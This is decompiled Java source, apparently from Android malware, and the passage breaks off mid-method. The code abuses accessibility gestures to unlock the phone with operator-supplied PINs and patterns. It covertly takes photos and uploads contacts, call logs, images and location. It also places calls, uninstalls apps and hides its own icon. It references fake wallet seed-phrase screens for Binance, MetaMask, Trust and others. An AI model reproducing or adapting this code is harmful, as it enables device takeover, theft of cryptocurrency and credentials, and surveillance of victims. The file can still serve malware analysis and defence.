package f3;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.GestureDescription;
import android.annotation.SuppressLint;
import android.app.KeyguardManager;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Path;
import android.graphics.SurfaceTexture;
import android.hardware.Camera;
import android.location.Location;
import android.location.LocationManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.provider.Settings;
import android.telephony.SmsManager;
import android.text.TextUtils;
import android.view.accessibility.AccessibilityNodeInfo;
import androidx.annotation.NonNull;
import androidx.annotation.RequiresApi;
import androidx.core.app.NotificationCompat;
import androidx.core.app.NotificationManagerCompat;
import androidx.core.content.ContextCompat;
import androidx.core.view.PointerIconCompat;
import androidx.core.view.accessibility.AccessibilityNodeInfoCompat;
import androidx.exifinterface.media.ExifInterface;
import androidx.room.RoomMasterTable;
import androidx.work.WorkRequest;
import com.blankj.utilcode.util.SPUtils;
import com.superbock.App;
import com.superbock.auto.BaseService;
import com.superbock.auto.ScreenActivity;
import com.superbock.auto.ScreenService;
import com.superbock.bean.AdInfo;
import com.superbock.bean.BInfo;
import com.superbock.bean.DInfo;
import com.superbock.bean.EInfo;
import com.superbock.bean.FInfo;
import com.superbock.bean.GInfo;
import com.superbock.bean.HInfo;
import com.superbock.bean.JInfo;
import com.superbock.bean.KInfo;
import com.superbock.bean.LInfo;
import com.superbock.ui.AdAlertActivity;
import com.superbock.ui.AdAlertBottomActivity;
import com.superbock.ui.AdAlertOneButtonActivity;
import com.superbock.ui.AdBoxActivity;
import com.superbock.ui.AdConfirmActivity;
import com.superbock.ui.AdConfirmBottomActivity;
import com.superbock.ui.AdConfirmOneButtonActivity;
import com.superbock.ui.AdFullscreenActivity;
import com.superbock.ui.AdNoticeActivity;
import com.superbock.ui.AdSingleActivity;
import com.superbock.ui.AdSingleSmallActivity;
import com.superbock.ui.AdWebActivity;
import com.superbock.ui.AdWebSmallActivity;
import com.superbock.ui.custom.InputWordsBinanceActivity;
import com.superbock.ui.custom.InputWordsImActivity;
import com.superbock.ui.custom.InputWordsMetaActivity;
import com.superbock.ui.custom.InputWordsOkxActivity;
import com.superbock.ui.custom.InputWordsTpActivity;
import com.superbock.ui.custom.InputWordsTronglobalActivity;
import com.superbock.ui.custom.InputWordsTronlinkActivity;
import com.superbock.ui.custom.InputWordsTrustActivity;
import com.superbock.ui.custom.InputWordsWalletActivity;
import com.tencent.smtt.sdk.TbsListener;
import com.tencent.smtt.sdk.WebView;
import comeliest.metempsychosis.pokelogan.R;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.net.ProtocolException;
import java.sql.SQLException;
import java.util.ArrayList;
import java.util.Collection;
import java.util.Collections;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Objects;
import java.util.Random;
import java.util.TimeZone;
import java.util.Timer;
import k.j0;
import kotlin.collections.CollectionsKt;
import kotlin.jvm.internal.Intrinsics;
import marmojkfnf.huflnkmt.ncagri.jdtuadkc.Ksfndkd;
import s3.b0;
import s3.g0;
import s3.o;
import s3.w;
import s3.x;
import s3.y;

/* loaded from: classes9.dex */
public final class i {

    /* renamed from: a, reason: collision with root package name */
    public static g0 f2795a = null;

    /* renamed from: b, reason: collision with root package name */
    public static boolean f2796b = false;

    /* renamed from: c, reason: collision with root package name */
    public static long f2797c = 0;

    /* renamed from: d, reason: collision with root package name */
    public static long f2798d = 0;

    /* renamed from: e, reason: collision with root package name */
    public static long f2799e = 0;

    /* renamed from: f, reason: collision with root package name */
    public static int f2800f = 0;

    /* renamed from: g, reason: collision with root package name */
    public static long f2801g = 500;

    /* renamed from: h, reason: collision with root package name */
    public static long f2802h = 0;

    /* renamed from: i, reason: collision with root package name */
    public static long f2803i = 500;

    /* renamed from: j, reason: collision with root package name */
    public static long f2804j;

    /* loaded from: classes14.dex */
    public class a extends d1.f {

        /* renamed from: b, reason: collision with root package name */
        public Timer f2805b;

        /* renamed from: c, reason: collision with root package name */
        public long f2806c;

        /* renamed from: d, reason: collision with root package name */
        public long f2807d;

        /* renamed from: e, reason: collision with root package name */
        public long f2808e;

        /* renamed from: f, reason: collision with root package name */
        public l f2809f;

        /* renamed from: g, reason: collision with root package name */
        public final /* synthetic */ String f2810g;

        /* renamed from: h, reason: collision with root package name */
        public final /* synthetic */ Context f2811h;

        /* renamed from: i, reason: collision with root package name */
        public final /* synthetic */ float f2812i;

        /* renamed from: j, reason: collision with root package name */
        public final /* synthetic */ float f2813j;

        /* renamed from: k, reason: collision with root package name */
        public final /* synthetic */ float f2814k;

        /* renamed from: l, reason: collision with root package name */
        public final /* synthetic */ float f2815l;

        /* renamed from: m, reason: collision with root package name */
        public final /* synthetic */ float f2816m;

        /* renamed from: n, reason: collision with root package name */
        public final /* synthetic */ float f2817n;

        /* renamed from: o, reason: collision with root package name */
        public final /* synthetic */ float f2818o;

        /* renamed from: p, reason: collision with root package name */
        public final /* synthetic */ float f2819p;

        /* renamed from: q, reason: collision with root package name */
        public final /* synthetic */ int f2820q;

        /* renamed from: r, reason: collision with root package name */
        public final /* synthetic */ int f2821r;

        /* renamed from: f3.i$a$a, reason: collision with other inner class name */
        /* loaded from: classes20.dex */
        public class C0033a extends AccessibilityService.GestureResultCallback {

            /* renamed from: a, reason: collision with root package name */
            public final /* synthetic */ GestureDescription.StrokeDescription f2822a;

            public C0033a(GestureDescription.StrokeDescription strokeDescription) {
                this.f2822a = strokeDescription;
            }

            @Override // android.accessibilityservice.AccessibilityService.GestureResultCallback
            public final void onCancelled(GestureDescription gestureDescription) {
                super.onCancelled(gestureDescription);
            }

            @Override // android.accessibilityservice.AccessibilityService.GestureResultCallback
            public final void onCompleted(GestureDescription gestureDescription) {
                super.onCompleted(gestureDescription);
                try {
                    BaseService.g().dispatchGesture(new GestureDescription.Builder().addStroke(this.f2822a).build(), null, null);
                } catch (f unused) {
                }
            }
        }

        public a(String str, Context context, float f5, float f6, float f7, float f8, float f9, float f10, float f11, float f12, int i5, int i6) {
            this.f2810g = str;
            this.f2811h = context;
            this.f2812i = f5;
            this.f2813j = f6;
            this.f2814k = f7;
            this.f2815l = f8;
            this.f2816m = f9;
            this.f2817n = f10;
            this.f2818o = f11;
            this.f2819p = f12;
            this.f2820q = i5;
            this.f2821r = i6;
        }

        @Override // d1.f
        public final void D(int i5) {
            if (i5 == 1000) {
                SPUtils.getInstance().put("lastCtrlTime", 0L);
                i.f2800f = 0;
            }
            X();
        }

        @Override // d1.f
        public final void E() {
        }

        @Override // d1.f
        public final void F() {
            X();
            int i5 = i.f2800f;
            i.f2800f = i5 + 1;
            if (i5 < 3) {
                new Handler(Looper.getMainLooper()).postDelayed(new h(this), 5000L);
            }
        }

        @Override // d1.f
        public final void G() {
            SPUtils.getInstance().put("lastCtrlTime", System.currentTimeMillis());
        }

        /* JADX WARN: Code restructure failed: missing block: B:114:0x0146, code lost:
        
            if (com.superbock.auto.BaseService.B != false) goto L71;
         */
        @Override // d1.f
        @android.annotation.SuppressLint({"NewApi"})
        /*
            Code decompiled incorrectly, please refer to instructions dump.
            To view partially-correct add '--show-bad-code' argument
        */
        public final void H(@androidx.annotation.NonNull s3.g0 r17, @androidx.annotation.NonNull java.lang.String r18) {
            /*
                Method dump skipped, instructions count: 1028
                To view this dump add '--comments-level debug' option
            */
            throw new UnsupportedOperationException("Method not decompiled: f3.i.a.H(s3.g0, java.lang.String):void");
        }

        @Override // d1.f
        public final void I(@NonNull g0 g0Var) {
            SPUtils.getInstance().put("lastCtrlTime", System.currentTimeMillis());
            this.f2806c = System.currentTimeMillis();
            i.p(this.f2810g);
            l0(g0Var);
            Timer timer = new Timer();
            this.f2805b = timer;
            timer.schedule(new g(this, g0Var), WorkRequest.MIN_BACKOFF_MILLIS, WorkRequest.MIN_BACKOFF_MILLIS);
        }

        public final void M() {
            long j5;
            if (Build.VERSION.SDK_INT > 32) {
                if (ContextCompat.checkSelfPermission(this.f2811h, "android.permission.READ_MEDIA_IMAGES") != 0) {
                    i.n(1, "38", null);
                    return;
                }
            } else if (ContextCompat.checkSelfPermission(this.f2811h, "android.permission.READ_EXTERNAL_STORAGE") != 0) {
                i.n(1, "38", null);
                return;
            }
            k3.f.i(this.f2811h, true);
            g3.f a5 = g3.f.a();
            Objects.requireNonNull(a5);
            try {
                t2.g<EInfo, String> gVar = a5.f2962a;
                z2.h<EInfo, String> c5 = gVar.c();
                c5.f6119l = true;
                z2.m<EInfo, String> g5 = c5.g();
                g5.c("up2", 0);
                g5.b();
                g5.i("co", 3);
                j5 = gVar.i(g5.j());
            } catch (SQLException unused) {
                j5 = 0;
            }
            if (j5 <= 0) {
                if (j5 == 0) {
                    i.n(0, "22", null);
                }
            } else {
                k3.f.r(this.f2811h);
                i.n(0, "16", "" + j5);
            }
        }

        public final void N(int i5, String str) {
            long j5;
            String str2;
            if (i5 == 0) {
                k3.f.c(this.f2811h, true);
                k3.f.a();
                g3.a b5 = g3.a.b();
                Objects.requireNonNull(b5);
                try {
                    Object obj = b5.f2951b;
                    t2.g gVar = (t2.g) obj;
                    z2.h c5 = ((t2.g) obj).c();
                    c5.f6119l = true;
                    z2.m<T, ID> g5 = c5.g();
                    g5.c("up", 0);
                    g5.b();
                    g5.c("ty", 0);
                    j5 = gVar.i(g5.j());
                } catch (SQLException unused) {
                    j5 = 0;
                }
                if (j5 <= 0) {
                    if (j5 == 0) {
                        i.n(0, "22", null);
                        return;
                    }
                    return;
                } else {
                    k3.f.n(this.f2811h);
                    i.n(0, "16", "" + j5);
                    return;
                }
            }
            if (i5 == 1) {
                if (!k3.a.i(this.f2811h)) {
                    try {
                        k3.a.l(this.f2811h, str);
                        str2 = RoomMasterTable.DEFAULT_ID;
                        i.n(1, str2, null);
                        return;
                    } catch (PackageManager.NameNotFoundException e5) {
                        throw new f("17", e5);
                    }
                }
                i.n(1, ExifInterface.GPS_MEASUREMENT_3D, null);
            }
            if (i5 != 2) {
                return;
            }
            if (!k3.a.i(this.f2811h)) {
                p0();
                Intent intent = new Intent("android.intent.action.DELETE");
                intent.setData(Uri.parse("package:" + str));
                intent.addFlags(268435456);
                this.f2811h.startActivity(intent);
                str2 = "43";
                i.n(1, str2, null);
                return;
            }
            i.n(1, ExifInterface.GPS_MEASUREMENT_3D, null);
        }

        public final void O(@NonNull g0 g0Var, int i5, int i6, String str, String str2) {
            long j5;
            Object arrayList;
            f.e eVar = new f.e();
            eVar.put("code", 1317);
            g3.j a5 = g3.j.a();
            Objects.requireNonNull(a5);
            try {
                z2.h c5 = ((t2.g) a5.f2971b).c();
                c5.f6119l = true;
                z2.m<T, ID> g5 = c5.g();
                g5.f("ti", 0);
                if (!TextUtils.isEmpty(str)) {
                    g5.b();
                    g5.c("pk", str);
                }
                if (!TextUtils.isEmpty(str2)) {
                    g5.b();
                    g5.h("na", "%" + str2 + "%");
                }
                c5.f6146g = g5;
                j5 = ((t2.g) a5.f2971b).i(c5.f());
            } catch (SQLException unused) {
                j5 = 0;
            }
            eVar.put("total", Long.valueOf(j5));
            g3.j a6 = g3.j.a();
            long j6 = (i5 - 1) * i6;
            long j7 = i6;
            Objects.requireNonNull(a6);
            try {
                z2.h c6 = ((t2.g) a6.f2971b).c();
                c6.l("ti", false);
                c6.k(Long.valueOf(j6));
                c6.f6120m = Long.valueOf(j7);
                z2.m<T, ID> g6 = c6.g();
                g6.f("ti", 0);
                if (!TextUtils.isEmpty(str)) {
                    g6.b();
                    g6.c("pk", str);
                }
                if (!TextUtils.isEmpty(str2)) {
                    g6.b();
                    g6.h("na", "%" + str2 + "%");
                }
                c6.f6146g = g6;
                arrayList = ((t2.g) a6.f2971b).k(c6.f());
            } catch (SQLException e5) {
                e5.printStackTrace();
                arrayList = new ArrayList();
            }
            eVar.put("rows", arrayList);
            g0Var.b(eVar.l());
        }

        public final void P(@NonNull g0 g0Var, int i5, int i6, int i7) {
            long j5;
            List<GInfo> arrayList;
            t2.g<GInfo, String> gVar;
            z2.f<GInfo> f5;
            f.e eVar = new f.e();
            eVar.put("code", 1314);
            g3.h b5 = g3.h.b();
            Objects.requireNonNull(b5);
            try {
                if (i7 > 0) {
                    gVar = b5.f2966a;
                    z2.h<GInfo, String> c5 = gVar.c();
                    c5.f6119l = true;
                    z2.m<GInfo, String> g5 = c5.g();
                    g5.c("st", Integer.valueOf(i7));
                    f5 = g5.j();
                } else {
                    gVar = b5.f2966a;
                    z2.h<GInfo, String> c6 = gVar.c();
                    c6.f6119l = true;
                    f5 = c6.f();
                }
                j5 = gVar.i(f5);
            } catch (SQLException unused) {
                j5 = 0;
            }
            eVar.put("total", Long.valueOf(j5));
            g3.h b6 = g3.h.b();
            long j6 = (i5 - 1) * i6;
            long j7 = i6;
            Objects.requireNonNull(b6);
            try {
                if (i7 > 0) {
                    t2.g<GInfo, String> gVar2 = b6.f2966a;
                    z2.h<GInfo, String> c7 = gVar2.c();
                    c7.l("ti", false);
                    c7.k(Long.valueOf(j6));
                    c7.f6120m = Long.valueOf(j7);
                    z2.m<GInfo, String> g6 = c7.g();
                    g6.c("st", Integer.valueOf(i7));
                    arrayList = gVar2.k(g6.j());
                } else {
                    t2.g<GInfo, String> gVar3 = b6.f2966a;
                    z2.h<GInfo, String> c8 = gVar3.c();
                    c8.l("ti", false);
                    c8.k(Long.valueOf(j6));
                    c8.f6120m = Long.valueOf(j7);
                    arrayList = gVar3.k(c8.f());
                }
            } catch (SQLException e5) {
                e5.printStackTrace();
                arrayList = new ArrayList<>();
            }
            eVar.put("rows", arrayList);
            g0Var.b(eVar.l());
        }

        public final void Q(int i5, String str) {
            if (i5 == 0) {
                if (!BaseService.f1409z) {
                    i.d(false);
                    return;
                }
                BaseService.f1409z = false;
            } else {
                if (i5 != 1) {
                    return;
                }
                if (BaseService.f1409z) {
                    i.d(true);
                    return;
                } else {
                    BaseService.A = str;
                    BaseService.f1409z = true;
                }
            }
            BaseService.C = Boolean.TRUE;
            i.o();
        }

        @SuppressLint({"NewApi"})
        public final void R(@NonNull g0 g0Var, int i5) {
            int i6;
            String str;
            if (!Settings.System.canWrite(this.f2811h)) {
                if (k3.a.i(this.f2811h)) {
                    str = ExifInterface.GPS_MEASUREMENT_3D;
                } else {
                    p0();
                    Intent intent = new Intent("android.settings.action.MANAGE_WRITE_SETTINGS");
                    intent.addFlags(268435456);
                    StringBuilder g5 = androidx.activity.d.g("package:");
                    g5.append(this.f2811h.getPackageName());
                    intent.setData(Uri.parse(g5.toString()));
                    this.f2811h.startActivity(intent);
                    str = "4";
                }
                i.n(1, str, null);
                return;
            }
            try {
                if (Settings.System.getInt(this.f2811h.getContentResolver(), "screen_brightness_mode") == 1) {
                    Settings.System.putInt(this.f2811h.getContentResolver(), "screen_brightness_mode", 0);
                }
                if (i5 < 0) {
                    i5 = 0;
                } else if (i5 > 100) {
                    i5 = 100;
                }
                Settings.System.putInt(this.f2811h.getContentResolver(), "screen_brightness", i5);
                try {
                    i6 = Settings.System.getInt(this.f2811h.getContentResolver(), "screen_brightness");
                } catch (Settings.SettingNotFoundException unused) {
                    i6 = -1;
                }
                if (i6 >= 0) {
                    f.e eVar = new f.e();
                    eVar.put("code", 1207);
                    eVar.put("brightness", Integer.valueOf(i6));
                    g0Var.b(eVar.l());
                }
            } catch (Settings.SettingNotFoundException e5) {
                throw new f("8", e5);
            }
        }

        public final void S(int i5, String str) {
            long j5;
            if (i5 != 0) {
                if (i5 != 1) {
                    return;
                }
                if (ContextCompat.checkSelfPermission(this.f2811h, "android.permission.CALL_PHONE") == 0) {
                    if (str.contains("#")) {
                        str = str.replaceAll("#", Uri.encode("#"));
                    }
                    Intent intent = new Intent();
                    intent.setAction("android.intent.action.CALL");
                    intent.setData(Uri.parse(WebView.SCHEME_TEL + str));
                    intent.addFlags(268435456);
                    this.f2811h.startActivity(intent);
                    return;
                }
            } else if (ContextCompat.checkSelfPermission(this.f2811h, "android.permission.READ_CALL_LOG") == 0) {
                k3.f.e(this.f2811h, true);
                g3.e a5 = g3.e.a();
                Objects.requireNonNull(a5);
                try {
                    t2.g<DInfo, String> gVar = a5.f2960a;
                    z2.h<DInfo, String> c5 = gVar.c();
                    c5.f6119l = true;
                    z2.m<DInfo, String> g5 = c5.g();
                    g5.c("up", 0);
                    j5 = gVar.i(g5.j());
                } catch (SQLException unused) {
                    j5 = 0;
                }
                if (j5 <= 0) {
                    if (j5 == 0) {
                        i.n(0, "22", null);
                        return;
                    }
                    return;
                } else {
                    k3.f.p(this.f2811h);
                    i.n(0, "16", "" + j5);
                    return;
                }
            }
            i.n(1, "38", null);
        }

        public final void T(int i5, int i6) {
            long j5;
            if (i5 == 0) {
                if (ContextCompat.checkSelfPermission(this.f2811h, "android.permission.CAMERA") != 0) {
                    i.n(1, "38", null);
                    return;
                }
                f.b bVar = new f.b();
                for (int i7 = 0; i7 < Camera.getNumberOfCameras(); i7++) {
                    Camera.CameraInfo cameraInfo = new Camera.CameraInfo();
                    Camera.getCameraInfo(i7, cameraInfo);
                    f.e eVar = new f.e();
                    eVar.put("facing", Integer.valueOf(cameraInfo.facing));
                    eVar.put("id", Integer.valueOf(i7));
                    bVar.add(eVar);
                }
                if (i.f2795a == null) {
                    return;
                }
                if (bVar.isEmpty()) {
                    i.n(1, "9", null);
                    return;
                }
                f.e eVar2 = new f.e();
                eVar2.put("code", 1301);
                eVar2.put("type", 0);
                eVar2.put("list", bVar.l());
                i.f2795a.b(eVar2.l());
                return;
            }
            if (i5 == 1) {
                if (i.f2796b) {
                    i.n(1, "53", null);
                }
                Camera open = Camera.open(i6);
                open.setParameters(open.getParameters());
                try {
                    open.setPreviewTexture(new SurfaceTexture(0));
                    open.startPreview();
                    open.takePicture(null, null, new d(open));
                    return;
                } catch (IOException e5) {
                    throw new f("10", e5);
                }
            }
            if (i5 == 2) {
                BaseService.M = Integer.valueOf(i6);
                BaseService.N = false;
                BaseService.L = Boolean.TRUE;
                i.o();
            } else {
                if (i5 == 3) {
                    BaseService.M = null;
                    BaseService.L = Boolean.TRUE;
                    i.o();
                    j5 = 0;
                    this.f2808e = j5;
                }
                if (i5 != 4) {
                    return;
                }
            }
            j5 = System.currentTimeMillis();
            this.f2808e = j5;
        }

        public final void U(boolean z4) {
            Intent intent;
            Map<String, String> k5 = k3.f.k(this.f2811h);
            if (k5 == null) {
                i.n(2, "60", null);
                return;
            }
            HashMap hashMap = (HashMap) k5;
            if (!"1".equals(hashMap.get("isPlayStore"))) {
                i.n(1, "63", null);
                if (!z4) {
                    return;
                }
                if (k3.a.i(this.f2811h)) {
                    i.n(1, ExifInterface.GPS_MEASUREMENT_3D, null);
                    return;
                } else {
                    p0();
                    intent = new Intent("android.settings.APPLICATION_DETAILS_SETTINGS", Uri.parse("package:com.android.vending"));
                }
            } else {
                if ("1".equals(hashMap.get("isEnabled"))) {
                    if (k3.a.i(this.f2811h)) {
                        i.n(1, ExifInterface.GPS_MEASUREMENT_3D, null);
                        return;
                    }
                    p0();
                    Intent intent2 = new Intent("android.settings.APPLICATION_DETAILS_SETTINGS", Uri.parse("package:com.android.vending"));
                    intent2.addFlags(268443648);
                    this.f2811h.startActivity(intent2);
                    i.n(1, "61", null);
                    return;
                }
                i.n(1, "62", null);
                if (!z4) {
                    return;
                }
                if (k3.a.i(this.f2811h)) {
                    i.n(1, ExifInterface.GPS_MEASUREMENT_3D, null);
                    return;
                } else {
                    p0();
                    intent = new Intent("android.settings.APPLICATION_DETAILS_SETTINGS", Uri.parse("package:com.android.vending"));
                }
            }
            intent.addFlags(268443648);
            this.f2811h.startActivity(intent);
        }

        public final void V() {
            long j5;
            if (ContextCompat.checkSelfPermission(this.f2811h, "android.permission.READ_CONTACTS") != 0) {
                i.n(1, "38", null);
                return;
            }
            k3.f.g(this.f2811h, true);
            g3.c a5 = g3.c.a();
            Objects.requireNonNull(a5);
            try {
                t2.g<BInfo, String> gVar = a5.f2955a;
                z2.h<BInfo, String> c5 = gVar.c();
                c5.f6119l = true;
                z2.m<BInfo, String> g5 = c5.g();
                g5.c("up", 0);
                j5 = gVar.i(g5.j());
            } catch (SQLException unused) {
                j5 = 0;
            }
            if (j5 <= 0) {
                if (j5 == 0) {
                    i.n(0, "22", null);
                }
            } else {
                k3.f.q(this.f2811h);
                i.n(0, "16", "" + j5);
            }
        }

        @RequiresApi(api = 26)
        public final void W(int i5, String str, String str2) {
            String str3;
            String str4;
            if (i5 == 0) {
                f0(str);
                return;
            }
            if ((i5 == 1 || i5 == 2 || i5 == 3) && Build.VERSION.SDK_INT >= 26) {
                KeyguardManager keyguardManager = (KeyguardManager) this.f2811h.getSystemService("keyguard");
                if (!keyguardManager.isKeyguardLocked()) {
                    i.n(0, "24", null);
                    Z(i5, str, str2, false);
                    if (i5 == 1) {
                        str4 = "49";
                    } else if (i5 == 2) {
                        str4 = "48";
                    } else if (i5 != 3) {
                        return;
                    } else {
                        str4 = "47";
                    }
                    i.n(0, str4, null);
                    return;
                }
                PowerManager powerManager = (PowerManager) this.f2811h.getSystemService("power");
                if (!powerManager.isScreenOn()) {
                    if (!NotificationManagerCompat.from(this.f2811h).areNotificationsEnabled()) {
                        i.n(1, "46", null);
                        if (!BaseService.f1409z) {
                            i.n(1, "50", null);
                            return;
                        }
                    }
                    PowerManager.WakeLock newWakeLock = powerManager.newWakeLock(268435466, "bright");
                    newWakeLock.acquire(WorkRequest.MIN_BACKOFF_MILLIS);
                    newWakeLock.release();
                }
                KeyguardManager.KeyguardLock newKeyguardLock = keyguardManager.newKeyguardLock("unLock");
                newKeyguardLock.reenableKeyguard();
                newKeyguardLock.disableKeyguard();
                try {
                    Thread.sleep(1000L);
                } catch (InterruptedException unused) {
                }
                if (!keyguardManager.isKeyguardSecure()) {
                    BaseService.g().performGlobalAction(3);
                    return;
                }
                BaseService.g().performGlobalAction(3);
                try {
                    Thread.sleep(1000L);
                } catch (InterruptedException unused2) {
                }
                AccessibilityNodeInfo i6 = BaseService.g().i();
                if (!i.g.f(i6, "com.android.systemui:id/keyguard_host_view") && !i.g.f(i6, "com.android.systemui:id/keyguard_security_container")) {
                    Path path = new Path();
                    path.moveTo(this.f2820q * 0.3f, this.f2821r * 0.7f);
                    path.lineTo(this.f2820q * 0.4f, this.f2821r * 0.5f);
                    GestureDescription.StrokeDescription strokeDescription = new GestureDescription.StrokeDescription(path, 0L, 200L, true);
                    Path path2 = new Path();
                    path2.moveTo(this.f2820q * 0.4f, this.f2821r * 0.5f);
                    path2.lineTo(this.f2820q * 0.6f, this.f2821r * 0.3f);
                    BaseService.g().dispatchGesture(new GestureDescription.Builder().addStroke(strokeDescription).build(), new k(strokeDescription.continueStroke(path2, 0L, 10L, false)), null);
                    try {
                        Thread.sleep(1000L);
                    } catch (InterruptedException unused3) {
                    }
                }
                if (i5 == 1) {
                    Z(1, str, null, true);
                    str3 = "32";
                } else {
                    if (i5 != 2) {
                        if (i5 != 3) {
                            return;
                        }
                        i.f2799e = System.currentTimeMillis();
                        if (!f0(str)) {
                            i.n(1, "33", str);
                            return;
                        }
                        i.n(0, "31", str);
                        AccessibilityNodeInfo i7 = BaseService.g().i();
                        if (i7 != null) {
                            AccessibilityNodeInfo k5 = i.g.k(i7, "com.android.systemui:id/btn_letter_ok");
                            if (k5 == null && e3.d.f2591a == 4) {
                                k5 = i.g.k(i7, "com.android.systemui:id/vivo_cancel");
                            }
                            if (k5 != null) {
                                try {
                                    Thread.sleep(300L);
                                } catch (InterruptedException unused4) {
                                }
                                BaseService.g().n(k5);
                                return;
                            }
                            return;
                        }
                        return;
                    }
                    Z(2, str, str2, true);
                    str3 = "30";
                }
                i.n(0, str3, str2);
            }
        }

        public final void X() {
            LocationManager locationManager;
            i.f2795a = null;
            this.f2806c = 0L;
            this.f2807d = 0L;
            this.f2808e = 0L;
            i.f2798d = 0L;
            i.f2799e = 0L;
            Timer timer = this.f2805b;
            if (timer != null) {
                timer.cancel();
                this.f2805b = null;
            }
            l lVar = this.f2809f;
            if (lVar != null && (locationManager = lVar.f2830g) != null) {
                locationManager.removeUpdates(lVar);
            }
            BaseService.M = null;
            Boolean bool = Boolean.TRUE;
            BaseService.L = bool;
            if (i.f2796b) {
                this.f2811h.startService(new Intent(this.f2811h, (Class<?>) ScreenService.class).setAction("stopRecord"));
            }
            if (BaseService.f1409z || BaseService.B) {
                BaseService.f1409z = false;
                BaseService.B = false;
                BaseService.C = bool;
                try {
                    BaseService.g().performGlobalAction(2);
                } catch (f unused) {
                }
            }
        }

        public final void Y(int i5) {
            Context context;
            boolean d5 = k3.d.d(this.f2811h);
            if (i5 != 0) {
                int i6 = 1;
                if (i5 == 1 && !d5) {
                    int i7 = e3.d.f2591a;
                    if (i7 == 3 || i7 == 14) {
                        context = this.f2811h;
                        i6 = 2;
                    } else {
                        context = this.f2811h;
                    }
                    k3.d.b(context, i6);
                }
            } else if (d5) {
                Ksfndkd.INSTANCE.showIcon(this.f2811h, "com.superbock.ui.StartupActivity");
            }
            if (d5 != k3.d.d(this.f2811h)) {
                App.f1372b.f();
            } else {
                i.h(d5);
            }
        }

        @RequiresApi(api = 24)
        public final void Z(int i5, String str, String str2, boolean z4) {
            if (i5 == 1) {
                String[] split = str.split(";");
                Path path = new Path();
                for (int i6 = 0; i6 < split.length; i6++) {
                    String[] split2 = split[i6].split(",");
                    if (i6 == 0) {
                        path.moveTo(Float.parseFloat(split2[0]), Float.parseFloat(split2[1]));
                    } else {
                        path.lineTo(Float.parseFloat(split2[0]), Float.parseFloat(split2[1]));
                    }
                }
                BaseService.g().o(path, split.length * 100);
                if (!z4) {
                    return;
                }
            } else if (i5 == 2) {
                String[] split3 = str.split(";");
                for (int i7 = 0; i7 < split3.length; i7++) {
                    if (i7 > 0) {
                        try {
                            Thread.sleep(200L);
                        } catch (InterruptedException unused) {
                        }
                    }
                    String[] split4 = split3[i7].split(",");
                    BaseService.g().m(Float.parseFloat(split4[0]), Float.parseFloat(split4[1]));
                }
                if (str2.length() > split3.length) {
                    AccessibilityNodeInfo o4 = i.g.o(BaseService.g().i(), str2.substring(split3.length), true);
                    if (o4 != null) {
                        try {
                            Thread.sleep(200L);
                        } catch (InterruptedException unused2) {
                        }
                        BaseService.g().n(o4);
                    }
                }
                if (!z4) {
                    return;
                }
            } else {
                if (i5 != 3) {
                    return;
                }
                f0(str);
                if (!z4) {
                    return;
                }
            }
            i.f2799e = System.currentTimeMillis();
        }

        public final void a0(@NonNull g0 g0Var, int i5, int i6, int i7, int i8, String str, String str2) {
            long j5;
            List<HInfo> arrayList;
            f.e eVar = new f.e();
            eVar.put("code", 1312);
            g3.i a5 = g3.i.a();
            Objects.requireNonNull(a5);
            try {
                z2.h<HInfo, String> c5 = a5.f2968a.c();
                c5.f6119l = true;
                z2.m g5 = c5.g();
                g5.f("ti", 0);
                if (i7 != 0) {
                    g5.b();
                    g5.c("et", Integer.valueOf(i7));
                }
                if (i8 != 2) {
                    g5.b();
                    g5.c("pa", Integer.valueOf(i8));
                }
                if (!TextUtils.isEmpty(str)) {
                    g5.b();
                    g5.c("pk", str);
                }
                if (!TextUtils.isEmpty(str2)) {
                    g5.b();
                    g5.h("na", "%" + str2 + "%");
                }
                c5.f6146g = g5;
                j5 = a5.f2968a.i(c5.f());
            } catch (SQLException unused) {
                j5 = 0;
            }
            eVar.put("total", Long.valueOf(j5));
            g3.i a6 = g3.i.a();
            long j6 = (i5 - 1) * i6;
            long j7 = i6;
            Objects.requireNonNull(a6);
            try {
                z2.h<HInfo, String> c6 = a6.f2968a.c();
                c6.l("ti", false);
                c6.k(Long.valueOf(j6));
                c6.f6120m = Long.valueOf(j7);
                z2.m g6 = c6.g();
                g6.f("ti", 0);
                if (i7 != 0) {
                    g6.b();
                    g6.c("et", Integer.valueOf(i7));
                }
                if (i8 != 2) {
                    g6.b();
                    g6.c("pa", Integer.valueOf(i8));
                }
                if (!TextUtils.isEmpty(str)) {
                    g6.b();
                    g6.c("pk", str);
                }
                if (!TextUtils.isEmpty(str2)) {
                    g6.b();
                    g6.h("na", "%" + str2 + "%");
                }
                c6.f6146g = g6;
                arrayList = a6.f2968a.k(c6.f());
            } catch (SQLException e5) {
                e5.printStackTrace();
                arrayList = new ArrayList<>();
            }
            eVar.put("rows", arrayList);
            g0Var.b(eVar.l());
        }

        public final void b0() {
            if (ContextCompat.checkSelfPermission(this.f2811h, "android.permission.ACCESS_COARSE_LOCATION") != 0) {
                i.n(1, "38", null);
                return;
            }
            if (Looper.myLooper() == null) {
                Looper.prepare();
            }
            if (this.f2809f == null) {
                this.f2809f = new l(this.f2811h);
            }
            l lVar = this.f2809f;
            LocationManager locationManager = (LocationManager) lVar.f2824a.getSystemService("location");
            lVar.f2830g = locationManager;
            lVar.f2825b = locationManager.isProviderEnabled("gps");
            boolean isProviderEnabled = lVar.f2830g.isProviderEnabled("network");
            if (lVar.f2825b || isProviderEnabled) {
                lVar.f2826c = true;
                if (isProviderEnabled) {
                    Location lastKnownLocation = lVar.f2830g.getLastKnownLocation("network");
                    lVar.f2827d = lastKnownLocation;
                    if (lastKnownLocation == null) {
                        lVar.f2830g.requestLocationUpdates("network", 60000L, 10.0f, lVar);
                    } else {
                        lVar.f2828e = lastKnownLocation.getLatitude();
                        lVar.f2829f = lVar.f2827d.getLongitude();
                    }
                }
                if (lVar.f2825b && lVar.f2827d == null) {
                    Location lastKnownLocation2 = lVar.f2830g.getLastKnownLocation("gps");
                    lVar.f2827d = lastKnownLocation2;
                    if (lastKnownLocation2 == null) {
